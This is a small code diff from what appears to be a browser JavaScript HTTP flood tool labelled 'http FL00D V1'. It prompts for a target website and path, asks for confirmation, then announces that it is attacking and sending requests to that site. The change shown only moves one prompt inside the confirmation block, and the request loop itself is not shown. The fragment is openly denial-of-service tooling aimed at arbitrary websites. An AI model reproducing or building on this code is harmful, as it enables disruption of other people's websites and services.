@@ -1,10 +1,11 @@
 function a() {
 
     var x = prompt("Website Here, example.com: ");
-    var a = prompt("Image Url Or /index.php, add / to the end: ");
 
 let text = "Are You Sure?\nOK or Cancel.";
 if (confirm(text) == true) {
+    var a = prompt("Image Url Or /index.php, add / to the end: ");
+
 text = alert("http FL00D V1 ATTACKING : " + x);
 text = document.write("SENDING REQUESTS TO : " + x);
 
